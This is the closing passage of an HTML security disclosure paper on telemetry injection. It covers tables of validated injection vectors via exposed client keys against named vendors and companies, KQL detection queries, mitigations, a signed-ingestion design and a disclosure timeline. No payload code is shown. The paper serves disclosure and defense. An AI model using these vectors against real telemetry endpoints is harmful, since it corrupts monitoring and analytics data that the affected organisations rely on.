+<tbody>
+<tr>
+<td>Microsoft</td>
+<td>App Insights</td>
+<td>Unauthenticated injection via iKey</td>
+<td>✅ Validated</td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td>OneCollector</td>
+<td>Unauthenticated injection with client-id=NO_AUTH</td>
+<td>✅ Validated</td>
+</tr>
+<tr>
+<td>Segment</td>
+<td>Analytics</td>
+<td>Write key injection</td>
+<td>✅ Validated</td>
+</tr>
+<tr>
+<td>Datadog</td>
+<td>RUM</td>
+<td>Client token injection</td>
+<td>✅ Validated</td>
+</tr>
+<tr>
+<td>CarMax</td>
+<td>App Insights</td>
+<td>iKey injection</td>
+<td>✅ Validated</td>
+</tr>
+<tr>
+<td>Flock Safety</td>
+<td>Segment/Datadog</td>
+<td>Key injection</td>
+<td>✅ Validated</td>
+</tr>
+</tbody>
+</table>
+<h3>7.3 Key Exposure Confirmed (Tier 2)</h3>
+<p>Identified exposed telemetry keys/endpoints, injection not validated:</p>
+<table>
+<thead>
+<tr>
+<th>Vendor</th>
+<th>Service</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Google</td>
+<td>Various telemetry endpoints</td>
+<td>Key exposure confirmed</td>
+</tr>
+<tr>
+<td>Meta</td>
+<td>Various telemetry endpoints</td>
+<td>Key exposure confirmed</td>
+</tr>
+<tr>
+<td>Apple</td>
+<td>Various telemetry endpoints</td>
+<td>Key exposure confirmed</td>
+</tr>
+<tr>
+<td>TikTok</td>
+<td>Various telemetry endpoints</td>
+<td>Key exposure confirmed</td>
+</tr>
+<tr>
+<td>LinkedIn</td>
+<td>Various telemetry endpoints</td>
+<td>Key exposure confirmed</td>
+</tr>
+</tbody>
+</table>
+<h3>7.4 Real-World Impact Summary</h3>
+<table>
+<thead>
+<tr>
+<th>Vendor</th>
+<th>Service</th>
+<th>Vector</th>
+<th>Confirmed</th>
+<th>Severity</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Microsoft</td>
+<td>App Insights</td>
+<td>Unauthenticated injection via iKey</td>
+<td>✅ Validated</td>
+<td>TBD</td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td>OneCollector</td>
+<td>Unauthenticated injection with NO_AUTH</td>
+<td>✅ Validated</td>
+<td>TBD</td>
+</tr>
+<tr>
+<td>Segment</td>
+<td>Analytics</td>
+<td>Write key injection</td>
+<td>✅ Validated</td>
+<td>HIGH</td>
+</tr>
+<tr>
+<td>Datadog</td>
+<td>RUM</td>
+<td>Client token injection</td>
+<td>✅ Validated</td>
+<td>HIGH</td>
+</tr>
+<tr>
+<td>CarMax</td>
+<td>App Insights</td>
+<td>iKey injection</td>
+<td>✅ Validated</td>
+<td>TBD</td>
+</tr>
+<tr>
+<td>Flock Safety</td>
+<td>Segment/Datadog</td>
+<td>Key injection</td>
+<td>✅ Validated</td>
+<td>TBD</td>
+</tr>
+<tr>
+<td>Google</td>
+<td>Various</td>
+<td>Telemetry injection</td>
+<td>🔍 Reconnaissance</td>
+<td>HIGH</td>
+</tr>
+<tr>
+<td>Meta</td>
+<td>Various</td>
+<td>Telemetry injection</td>
+<td>🔍 Reconnaissance</td>
+<td>HIGH</td>
+</tr>
+<tr>
+<td>Apple</td>
+<td>Various</td>
+<td>Telemetry injection</td>
+<td>🔍 Reconnaissance</td>
+<td>HIGH</td>
+</tr>
+<tr>
+<td>TikTok</td>
+<td>Various</td>
+<td>Telemetry injection</td>
+<td>🔍 Reconnaissance</td>
+<td>HIGH</td>
+</tr>
+<tr>
+<td>LinkedIn</td>
+<td>Various</td>
+<td>Telemetry injection</td>
+<td>🔍 Reconnaissance</td>
+<td>HIGH</td>
+</tr>
+</tbody>
+</table>
+<h2>8. Mitigations and Recommendations</h2>
+<h3>8.1 Recommendations for Defenders</h3>
+<p><strong>Immediate actions:</strong><br />
+- Disable local authentication on telemetry ingestion endpoints and require Entra ID (Azure AD) authentication where supported.<br />
+- Rotate exposed keys immediately; do not embed keys in client-side code where avoidable.<br />
+- Implement IP restrictions on ingestion endpoints where possible.<br />
+- Monitor for anomalous telemetry patterns (unexpected event names, high volume from a single source, marker patterns).</p>
+<p><strong>Detection rules (KQL for Azure App Insights):</strong></p>
+<pre><code class="language-kql">// Detect potential telemetry injection — unusual event names
+customEvents
+| where timestamp &gt; ago(24h)
+| where name contains &quot;INJECTED&quot;
+  or name contains &quot;TEST&quot;
+  or name matches regex @&quot;[A-Z]{10,}&quot;
+| summarize Count = count() by name, user_Id, session_Id
+| where Count &gt; 100
+| project timestamp, name, user_Id, session_Id, Count
+
+// Detect potential telemetry injection — suspicious properties
+customEvents
+| where timestamp &gt; ago(24h)
+| where properties has &quot;marker&quot;
+  or properties has &quot;test&quot;
+  or properties has &quot;inject&quot;
+| project timestamp, name, properties, user_Id, session_Id
+</code></pre>
+<p><strong>Long-term actions:</strong><br />
+- Redesign telemetry ingestion with cryptographic signing to ensure provenance.<br />
+- Implement provenance tracking at ingestion time to distinguish trusted from untrusted sources.<br />
+- Sanitize telemetry before AI training using provenance validation.<br />
+- Conduct regular audits of telemetry pipelines for unauthorized injection.</p>
+<h3>8.2 Vendor-Specific Mitigation Guidance</h3>
+<ul>
+<li><strong>Microsoft Application Insights:</strong> enable Entra ID authentication; customer-managed keys; instrumentation validation.</li>
+<li><strong>Segment:</strong> review write-key exposure in client-side code; server-side tracking for sensitive analytics; anomaly filtering.</li>
+<li><strong>Datadog:</strong> review RUM client-token exposure; IP allowlisting; monitor for suspicious RUM events.</li>
+</ul>
+<h3>8.3 Recommendations for Vendors</h3>
+<p>Treat instrumentation keys as credentials and require rotation; make authentication mandatory by default; provide clear guidance on securing telemetry ingestion; implement provenance tracking; add cryptographic signatures at the source.</p>
+<h3>8.4 Reference Architecture: Secure Telemetry Ingestion</h3>
+<pre><code>[Application] → [Signed Telemetry] → [Ingestion Gateway] → [Provenance Validation] → [Telemetry Pipeline]
+                                          ↑                       ↓
+                                    [Private Key]        [Validation Service]
+</code></pre>
+<ul>
+<li><strong>Signed Telemetry:</strong> applications sign events with a private key.</li>
+<li><strong>Ingestion Gateway:</strong> validates signatures before forwarding.</li>
+<li><strong>Provenance Validation:</strong> tags events with trust level (authentic, unverified, suspicious).</li>
+<li><strong>Telemetry Pipeline:</strong> routes events based on trust level.</li>
+</ul>
+<p>This architecture ensures that even if injection occurs, downstream consumers can distinguish trusted from untrusted telemetry.</p>
+<h3>8.5 The Path Forward</h3>
+<p>The industry must recognize that telemetry is not a trusted source of truth. Telemetry ingestion must be treated as an attack surface, not a trusted input channel. Defense priorities: authentication (mandatory for all ingestion), provenance (cryptographic), sanitization (before AI models), monitoring (continuous). The September 5, 2026 disclosure of this research is intended to drive this conversation forward.</p>
+<h2>Appendix A: Vendor-Specific Injection Payloads (authorized testing only; placeholder keys)</h2>
+<p>Payload skeletons for Microsoft App Insights, OneCollector, Segment, and Datadog RUM follow the Section 2.3 shapes with <code>&lt;IKEY&gt;</code>, <code>&lt;APIKEY&gt;</code>, <code>&lt;WRITE_KEY&gt;</code>, <code>&lt;CLIENT_TOKEN&gt;</code>, <code>&lt;APP_ID&gt;</code> placeholders. <strong>Do not substitute real keys unless you are authorized to test that target.</strong> Use unique harmless canary markers; stop after ingestion is demonstrated.</p>
+<h2>Appendix B: Disclosure Timeline</h2>
+<table>
+<thead>
+<tr>
+<th>Date</th>
+<th>Event</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>June 6, 2026</td>
+<td>Initial disclosure to Microsoft MSRC (VULN-193698)</td>
+</tr>
+<tr>
+<td>June 9, 2026</td>
+<td>MSRC Case 121314 opened</td>
+</tr>
+<tr>
+<td>July 6, 2026</td>
+<td>OneCollector vulnerability disclosed (VULN-200045)</td>
+</tr>
+<tr>
+<td>July 29, 2026</td>
+<td>CarMax third-party validation confirmed</td>
+</tr>
+<tr>
+<td>August 2026</td>
+<td>Segment and Datadog findings confirmed</td>
+</tr>
+<tr>
+<td>September 5, 2026</td>
+<td>Public disclosure / CERT/CC coordination</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Note on named organizations:</strong> CarMax and Flock Safety were notified prior to publication. All identified keys have been redacted in this public version. Organizations seeking validation of their exposure should contact the authors directly.</p>
+<h2>Appendix C: References</h2>
+<ul>
+<li>Microsoft Application Insights security guidance</li>
+<li>Application Insights instrumentation key exposure documentation</li>
+<li>Segment write key exposure guidance</li>
+<li>Datadog RUM injection documentation</li>
+<li>AIOps telemetry manipulation research (AIOpsDoom)</li>
+<li>Model telemetry poisoning research</li>
+<li>Telemetry provenance and trust</li>
+<li>FTC Act Section 5; GDPR; CCPA/CPRA; FTC data security guidance</li>
+</ul>
+<hr />
+<p><strong>Authors:</strong> ek0ms savi0r &amp; k3n · <strong>Date:</strong> September 5, 2026<br />
+<strong>Contact:</strong> via CERT/CC for questions or security disclosures.</p>
+<p>This paper is intended to promote discussion about architectural security in telemetry systems. The findings described herein are based on publicly available information and independent research. Organizations are encouraged to assess their own telemetry pipelines and implement appropriate security controls.</p>
+</main>
+<footer class="site-footer"><div class="container">
+<p>&copy; 2026 Church of Malware &middot; <a href="https://churchofmalware.org">churchofmalware.org</a> &middot; <a href="index.html">triage home</a></p>
+<p class="note">Public-interest disclosure. No exploit code; no instructions enabling harm. TLP:CLEAR.</p>
+</div></footer>
+</body>
+</html>
